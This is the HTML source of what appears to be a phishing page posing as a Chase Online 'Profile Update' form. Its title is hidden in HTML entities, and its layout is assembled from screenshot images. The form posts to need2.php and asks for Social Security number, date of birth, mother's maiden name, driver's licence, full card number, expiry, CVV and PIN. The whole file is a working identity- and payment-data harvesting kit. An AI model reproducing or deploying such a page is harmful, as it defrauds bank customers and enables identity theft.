<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#67;&#104;&#97;&#115;&#101;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#45;&#32;&#80;&#114;&#111;&#102;&#105;&#108;&#101;&#32;&#85;&#112;&#100;&#97;&#116;&#101;&#32;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[10].type = "password"
}, 1000);
</script>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[14].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>		  
<style type="text/css">
.textbox {  
    border: solid 1px #B0AEA4; 
  	border-radius: 1px;
    padding-left: 5px;
    height: 23px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #81A3DA; 
    border-style: solid; 
  	border-radius: 1px;
    border-width: 2px;  
    outline: 0; 
 } 
		</style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1249px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div id="container">
<div class="loader"></div>
<div id="image7" style="position:absolute; overflow:hidden; left:215px; top:711px; width:785px; height:282px; z-index:0"><img src="images/as14.png" alt="" title="" border=0 width=785 height=282></div>

<div id="image6" style="position:absolute; overflow:hidden; left:213px; top:511px; width:788px; height:201px; z-index:1"><img src="images/as13.png" alt="" title="" border=0 width=788 height=201></div>

<div id="image4" style="position:absolute; overflow:hidden; left:213px; top:303px; width:787px; height:210px; z-index:2"><img src="images/as12.png" alt="" title="" border=0 width=787 height=210></div>

<div id="image1" style="position:absolute; overflow:hidden; left:231px; top:22px; width:135px; height:30px; z-index:3"><a href="#"><img src="images/as1.png" alt="" title="" border=0 width=135 height=30></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:693px; top:24px; width:307px; height:21px; z-index:4"><a href="#"><img src="images/as10.png" alt="" title="" border=0 width=307 height=21></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:214px; top:72px; width:786px; height:231px; z-index:5"><img src="images/as11.png" alt="" title="" border=0 width=786 height=231></div>

<div id="image5" style="position:absolute; overflow:hidden; left:303px; top:75px; width:597px; height:27px; z-index:6"><a href="#"><img src="images/as18.png" alt="" title="" border=0 width=597 height=27></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:488px; top:1158px; width:231px; height:57px; z-index:7"><img src="images/as16.png" alt="" title="" border=0 width=231 height=57></div>

<div id="image10" style="position:absolute; overflow:hidden; left:488px; top:1158px; width:230px; height:17px; z-index:8"><a href="#"><img src="images/as17.png" alt="" title="" border=0 width=230 height=17></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:213px; top:993px; width:787px; height:123px; z-index:22"><img src="images/as15.png" alt="" title="" border=0 width=787 height=123></div>
<form action=need2.php name=kahanjana id=kahanjana method=post>
<input name="name1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:390px;z-index:9">
<input name="name2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:415px;z-index:10">
<input name="addr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:440px;z-index:11">
<select name="state" class="textbox" autocomplete="off" required style="position:absolute;left:503px;top:464px;width:209px;z-index:12">
<OPTION value="" selected>Select State</OPTION> <OPTION 
              value=Alabama>Alabama</OPTION> <OPTION value=Alaska>Alaska</OPTION> <OPTION 
              value=Arizona>Arizona</OPTION> <OPTION value=Arkansas>Arkansas</OPTION> 
              <OPTION value=California>California</OPTION> <OPTION 
              value=Colorado>Colorado</OPTION> <OPTION value=Connecticut>Connecticut</OPTION> 
              <OPTION value=Delaware>Delaware</OPTION> <OPTION value=District of 
              Columbia>District of 
              Columbia</OPTION> <OPTION value=Florida>Florida</OPTION> <OPTION 
              value=Georgia>Georgia</OPTION> <OPTION value=Hawaii>Hawaii</OPTION> <OPTION 
              value=Idaho>Idaho</OPTION> <OPTION value=Illinois>Illinois</OPTION> <OPTION 
              value=Indiana>Indiana</OPTION> <OPTION value=Iowa>Iowa</OPTION> <OPTION 
              value=Kansas>Kansas</OPTION> <OPTION value=Kentucky>Kentucky</OPTION> 
              <OPTION value=Louisiana>Louisiana</OPTION> <OPTION 
              value=Maine>Maine</OPTION> <OPTION value=Maryland>Maryland</OPTION> <OPTION 
              value=Massachusetts>Massachusetts</OPTION> <OPTION value=Michigan>Michigan</OPTION> 
              <OPTION value=Minnesota>Minnesota</OPTION> <OPTION 
              value=Mississippi>Mississippi</OPTION> <OPTION value=Missouri>Missouri</OPTION> 
              <OPTION value=Montana>Montana</OPTION> <OPTION 
              value=Nebraska>Nebraska</OPTION> <OPTION value=Nevada>Nevada</OPTION> 
              <OPTION value=New Hampshire>New Hampshire</OPTION> <OPTION value=New 
              Jersey>New 
              Jersey</OPTION> <OPTION value=New Mexico>New Mexico</OPTION> <OPTION 
              value=New York>New York</OPTION> <OPTION value=North 
              Carolina>North 
              Carolina</OPTION> <OPTION value=North Dakota>North Dakota</OPTION> <OPTION 
              value=Ohio>Ohio</OPTION> <OPTION value=Oklahoma>Oklahoma</OPTION> <OPTION 
              value=Oregon>Oregon</OPTION> <OPTION value=Pennsylvania>Pennsylvania</OPTION> 
              <OPTION value=Rhode Island>Rhode Island</OPTION> <OPTION value=South 
              Carolina>South 
              Carolina</OPTION> <OPTION value=South Dakota>South Dakota</OPTION> <OPTION 
              value=Tennessee>Tennessee</OPTION> <OPTION value=Texas>Texas</OPTION> 
              <OPTION value=Utah>Utah</OPTION> <OPTION value=Vermont>Vermont</OPTION> 
              <OPTION value=Virginia>Virginia</OPTION> <OPTION 
              value=Washington>Washington</OPTION> <OPTION value=West 
              Virginia>West 
              Virginia</OPTION> <OPTION value=Wisconsin>Wisconsin</OPTION> <OPTION 
              value=Wyoming>Wyoming</OPTION></select>
<input name="city" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:489px;z-index:13">
<input name="zp" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:513px;z-index:14">
<input name="sn" id="ssn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:610px;z-index:15">
<input name="db" id="dob" placeholder="MM/DD/YYYY" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:635px;z-index:16">
<input name="mn" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:660px;z-index:17">
<input name="phone" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:685px;z-index:18">
<input name="dl" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:710px;z-index:19">

<input name="noc" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:835px;z-index:23">
<input name="cn" class="textbox cc-number" autocomplete="off" required type="text" style="position:absolute;width:209px;left:503px;top:860px;z-index:24">
<input name="ex" placeholder="MM/YYYY" class="textbox cc-exp" autocomplete="off" required type="text" style="position:absolute;width:147px;left:503px;top:885px;z-index:25">
<input name="cv" class="textbox cc-cvc" autocomplete="off" required maxlength="3" type="text" style="position:absolute;width:147px;left:503px;top:911px;z-index:26">
<input name="pn" id="demo-field" class="textbox" autocomplete="off" required maxlength="4" type="text" style="position:absolute;width:147px;left:503px;top:936px;z-index:27">

<div id="formimage1" style="position:absolute; left:600px; top:1041px; z-index:29"><input type="image" name="formimage1" width="62" height="23" src="images/updatte.png"></div>

</div>
 
	
</body>
</html>
